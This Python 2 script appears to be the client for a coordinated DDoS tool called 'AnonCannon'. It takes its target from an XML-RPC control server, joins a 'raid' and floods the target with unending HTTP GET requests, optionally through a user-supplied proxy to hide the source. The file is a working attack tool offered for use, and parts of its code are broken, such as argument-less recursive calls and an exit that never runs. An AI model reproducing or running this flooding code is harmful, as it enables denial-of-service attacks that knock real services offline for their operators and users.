#!/usr/bin/env python
#AnnonCannon DDoS  client
#Take it Down!
import xmlrpclib                       #For server communication
import httplib                          #For the worst DDoS Algo ever
import urllib
from xml.etree import ElementTree as ET # For function get_config()
import os
def get_language(tree, number):
  root = tree.getroot()
  return root[number].text
def attack(answer, port):
  if(answer == ""):
    print no_proxy_warn
    try:
      print now_attack_prnt
      while(attacking == True):
        ul = urllib.urlopen(attack_target)
    except KeyboardInterrupt:
      answer = raw_input(close_ask +  "(y/n)")
      if(answer == "y"):
        print close_prnt
        exit()
      if(answer == "n"):
        print back_to_attack    #Sorry!      
        attack()
  else:
    try:
      print now_attack_prnt
      h1 = httplib.HTTPConnection(answer, int(port))
      while(attacking == True):
        h1.request("GET", attack_target)
    except KeyboardInterrupt:
     answer = raw_input() 
     if(answer == "y"):
        print close_prnt
        exit()
     if(answer == "n"):
        print back_to_attack    #Sorry!      
        attack()
print "AnonCannon ALPHA 1 Client"
print "-----------------------------------------------------------------"
#Language integration.
if os.path.isfile("language.xml"):
  tree = ET.parse('language.xml')
  control_srv_ask = get_language(tree, 0)
  actual_tar_prnt = get_language(tree, 1)
  attack_join_ask = get_language(tree, 2)
  attack_jin_prnt = get_language(tree, 3)
  group_num_prnt  = get_language(tree, 4)
  socks_host_ask  = get_language(tree, 5)
  socks_port_ask  = get_language(tree, 6)
  no_proxy_warn   = get_language(tree, 7)
  close_prnt      = get_language(tree, 8)
  now_attack_prnt = get_language(tree, 9)
  close_ask       = get_language(tree, 10)
  back_to_attack  = get_language(tree, 11)
else:  
  control_srv_ask = "Enter your Control server>>>"
  actual_tar_prnt = "Actual Attack target of "
  attack_join_ask = "Do you want to join the Attack"
  attack_jin_prnt = "Joining the Attack on:"
  group_num_prnt  = "You are in Group:" 
  socks_host_ask  = "Please enter a SOCKS proxy(without port!)>>"
  socks_port_ask  = "Please enter the Port for Proxy>>"
  no_proxy_warn   = "You are using no proxy. Dangerous."
  close_prnt      = "Quiting."
  now_attack_prnt = "[!] Now attacking!"
  close_ask       = "Do you want to quit"
  back_to_attack  = "Going back to attack"                #! Sorry!
address       = raw_input(control_srv_ask)
cli           = xmlrpclib.Server(address)
attack_target = cli.current_attack_address()
attacking     = False
print cli.welcome_message()
print(actual_tar_prnt+ cli.get_raid_name()  + ":" + attack_target)
answer = raw_input(attack_join_ask  + "(y/n):")
if(answer == "y"):
  print attack_jin_prnt + attack_target
  attacking = True
  group_number = cli.groups()
  print group_num_prnt + group_number
  answer = raw_input(socks_host_ask)
  port   = raw_input(socks_port_ask)
  attack(answer, port)
if(answer == "n"):
  print close_prnt
  exit
